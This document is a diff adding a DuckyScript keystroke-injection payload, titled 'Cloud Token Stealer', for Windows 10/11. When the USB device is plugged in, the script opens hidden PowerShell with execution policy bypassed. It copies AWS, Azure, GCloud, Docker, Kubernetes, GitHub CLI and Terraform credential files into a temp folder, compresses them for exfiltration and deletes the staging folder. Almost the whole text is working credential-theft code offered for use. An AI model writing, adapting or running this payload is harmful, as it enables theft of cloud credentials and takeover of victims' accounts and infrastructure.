@@ -1,0 +1,72 @@
+REM =============================================
+REM Title: Cloud Token Stealer
+REM Author: bad-antics
+REM Description: Extract cloud service tokens from browsers
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\cloudloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Extract AWS credentials
+STRING if(Test-Path "$env:USERPROFILE\.aws\credentials"){cp "$env:USERPROFILE\.aws\credentials" "$d\aws_creds.txt"}
+ENTER
+DELAY 200
+
+REM Extract Azure CLI tokens
+STRING if(Test-Path "$env:USERPROFILE\.azure"){cp -r "$env:USERPROFILE\.azure" "$d\azure" -Force}
+ENTER
+DELAY 200
+
+REM Extract GCloud credentials
+STRING if(Test-Path "$env:APPDATA\gcloud"){cp -r "$env:APPDATA\gcloud" "$d\gcloud" -Force}
+ENTER
+DELAY 200
+
+REM Extract Docker credentials
+STRING if(Test-Path "$env:USERPROFILE\.docker\config.json"){cp "$env:USERPROFILE\.docker\config.json" "$d\docker_config.json"}
+ENTER
+DELAY 200
+
+REM Extract Kubernetes config
+STRING if(Test-Path "$env:USERPROFILE\.kube\config"){cp "$env:USERPROFILE\.kube\config" "$d\kube_config.txt"}
+ENTER
+DELAY 200
+
+REM Extract GitHub CLI tokens
+STRING if(Test-Path "$env:APPDATA\GitHub CLI"){cp -r "$env:APPDATA\GitHub CLI" "$d\github_cli" -Force}
+ENTER
+DELAY 200
+
+REM Extract Terraform tokens
+STRING if(Test-Path "$env:APPDATA\terraform.d\credentials.tfrc.json"){cp "$env:APPDATA\terraform.d\credentials.tfrc.json" "$d\terraform_creds.json"}
+ENTER
+DELAY 200
+
+REM Create summary
+STRING Get-ChildItem $d -Recurse | Out-File "$d\inventory.txt"
+ENTER
+DELAY 200
+
+REM Compress for exfil
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\cloud_$(hostname).zip" -Force
+ENTER
+DELAY 500
+
+REM Cleanup
+STRING Remove-Item $d -Recurse -Force
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
